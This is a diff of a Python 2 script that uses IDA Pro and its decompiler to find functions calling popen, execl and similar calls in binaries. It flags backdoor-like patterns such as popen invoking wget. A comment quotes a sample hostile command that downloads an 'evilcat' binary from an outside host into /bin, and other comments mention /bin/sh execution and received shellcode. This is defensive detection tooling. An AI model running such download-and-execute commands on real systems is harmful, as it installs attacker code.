@@ -4,67 +4,106 @@ import time
 import os
 import sys
 work_dir='D:\\source\\test1\\'
+#global var
+g_node_num_name={}
+g_node_name_num={}
+g_func_name_address={}
+g_graph_lines=[]
+#get the c_lines list from ida command
 def ida_disassam(file_name,addr):	
 	#idaw -Ohexrays:-errs:-mail=john@mail.com:outfile:ALL -A input
 	#ida64.exe -Ohexrays:-errs:-mail=john@mail.com:3658:main -A  "D:\source\test1\install_dir\p_17\test_xcb_image_shm"
-	file_dir=os.path.dirname(file_name)
-	
-	func_name_file=file_dir+'\\func_'+hex(addr)+'.c'
+	file_dir=os.path.dirname(file_name)	
+	func_name_file=file_dir+'\\func_'+addr+'.c'
 	if(os.path.isfile(func_name_file)==False):		
-		cmd='ida64.exe -Ohexrays:-errs:-mail=john@mail.com:func_'+hex(addr)+':'+hex(addr)+' -A '+file_name
-		print cmd
-		os.system(cmd)
-	
+		cmd='ida64.exe -Ohexrays:-errs:-mail=john@mail.com:func_'+addr+':'+addr+' -A '+file_name
+		#print cmd
+		os.system(cmd)	
 	myfile=open(func_name_file,'r')
 	c_lines=[]
 	for line in myfile.readlines():
 		c_lines.append(line)
 	return c_lines
-	
-#read share folder 
-def get_analysis_funcs_addr_name(file_name):
-	addrs=[]
-	myfile=open(file_name,'r')
+#initial global node dict
+def initial_node_name_dict():
+	global g_node_name_num,g_node_num_name
+	for line in g_graph_lines:
+		#node: { title: "59" label: "strrchr" color: 80 textcolor: 73 bordercolor: black }
+		reg_node=re.search('node: \{ title: "(?P<num>.*)" label: "(?P<name>.*)"',line)
+		if reg_node:
+			num=reg_node.group('num')
+			name=reg_node.group('name')
+			g_node_num_name[num]=name
+			g_node_name_num[name]=num
+#initial global func name address dict
+def initial_func_name_addr_dict(file_name):
+	global g_func_name_address
+	func_file=file_name+'.funcs'
+	myfile=open(func_file,'r')
 	for line in myfile.readlines():
-		tmp_addr=int(line.split(' ')[0],16)
-		tmp_name=line.split(' ')[1].strip('\n')
-		addrs.append((tmp_addr,tmp_name))
-	return addrs
+		func_addr=line.split(' ')[0][:-1] #strip L
+		func_name=line.split(' ')[1][:-1] #strip '\n'
+		#print func_name,func_addr
+		g_func_name_address[func_name]=func_addr
 
+#get the function call graph lines list from ida python script(idapython_get_call_graph.py)
+def initial_ida_get_call_graph(file_name):	
+	global g_graph_lines,work_dir
+	#ida64.exe  -A -S"D:\source\idapython\test-ida.py" "D:\source\test1\old\p_16\symlinks"
+	gdl_file=file_name+'.gdl'
+	if(os.path.isfile(gdl_file)==False):		
+		cmd='ida64.exe -S"'+work_dir+'idapython\\idapython\\idapython_get_call_graph.py" -A '+file_name
+		print cmd
+		os.system(cmd)	
+	myfile=open(gdl_file,'r')
+	for line in myfile.readlines():
+		g_graph_lines.append(line)
+	myfile.close()
+	initial_node_name_dict()
+	initial_func_name_addr_dict(file_name)
+
+
+
+#get the caller func name from the callee_func_name(like .popen)
+def get_caller_func(callee_func_name): 
+	global g_graph_lines,g_node_name_num,g_node_num_name
+	caller_func_name=set()
+	callee_func_num=g_node_name_num[callee_func_name]
+	#get caller func node num from the edge
+	for line in g_graph_lines:
+		#edge: { sourcename: "40" targetname: "23" }
+		reg_edge=re.search('edge: \{ sourcename: "(?P<num>.*)" targetname: "'+callee_func_num+'"',line)
+		if reg_edge:
+			caller_func_num=reg_edge.group('num')
+			caller_func_name.add(g_node_num_name[caller_func_num])
+	return caller_func_name
+	
 
 
 
 def test_popen(mylog,file_name_path):
-	global work_dir
-	file_name=os.path.basename(file_name_path)
-	p_dir=os.path.dirname(file_name_path).split('\\')[-1]
-	addrs=get_analysis_funcs_addr_name(work_dir+'addrs\\'+p_dir+'\\'+file_name+'.popen')
-	#addrs=get_analysis_funcs_addr_name(work_dir+'addrs\\'+file_name+'.popen')
-	
-	for addr_tuple in addrs:
-		addr=addr_tuple[0]
-		f = addr_tuple[1]
-		if(f is not None ):
-			test_func_flag=0
-			mylog.write('start popen analysis func: '+f)
-			print 'start popen analysis func: '+f,
-			
-			c_lines=ida_disassam(file_name_path,addr)
-			
-			if(len(c_lines)==0):
-				print 'decompile_func error'
-			else:
-				for line in c_lines:
-					#popen("cd /bin;wget -O evilcat http://myip.com/evilcat", "r");
-					regex=re.search('popen\(.*wget',line)
-					if regex:
-						mylog.write(',yes\n')
-						print ',yes'
-						test_func_flag=1
-						break
-			if(test_func_flag==0):
-				mylog.write(',no\n')
-				print ',no'
+	global work_dir,g_func_name_address
+	caller_func_name_set=get_caller_func('.popen')
+	for caller_func_name in caller_func_name_set:
+		test_func_flag=0
+		mylog.write('start popen analysis func: '+caller_func_name)
+		print 'start popen analysis func: '+caller_func_name,	
+		addr=g_func_name_address[caller_func_name]	
+		c_lines=ida_disassam(file_name_path,addr)		
+		if(len(c_lines)==0):
+			print 'decompile_func error'
+		else:
+			for line in c_lines:
+				#popen("cd /bin;wget -O evilcat http://myip.com/evilcat", "r");
+				regex=re.search('popen\(.*wget',line)
+				if regex:
+					mylog.write(',yes\n')
+					print ',yes'
+					test_func_flag=1
+					break
+		if(test_func_flag==0):
+			mylog.write(',no\n')
+			print ',no'
 #execl(path, "/bin/sh", 0LL);
 def test_execl(mylog,file_name_path):
 	global work_dir
@@ -354,6 +393,7 @@ def test_recv_shellcode(mylog,file_name_path):
 				print ',no'
 def main(file_name_path):
 	global work_dir
+	initial_ida_get_call_graph(file_name_path)
 	base_name=os.path.basename(file_name_path)
 	p_dir=os.path.dirname(file_name_path).split('\\')[-1]
 	output_dir=work_dir+'output\\'+p_dir+'\\'
@@ -366,6 +406,7 @@ def main(file_name_path):
 	mylog=open(output_dir+base_name+'.output','w')
 	print 'start popen analysis'	
 	test_popen(mylog,file_name_path)
+	'''
 	print 'start system analysis'
 	test_system(mylog,file_name_path)
 	test_system1(mylog,file_name_path)
@@ -377,7 +418,8 @@ def main(file_name_path):
 	test_execl(mylog,file_name_path)
 	mylog.close()
 	print 'ok'
-	#idc.Exit(0)
+	
+	'''
 
 
     
@@ -386,4 +428,5 @@ if(len(sys.argv)!=2):
 file_name_arg=sys.argv[1]
 print file_name_arg
 
-#main(file_name_arg)
+
+main(file_name_arg)
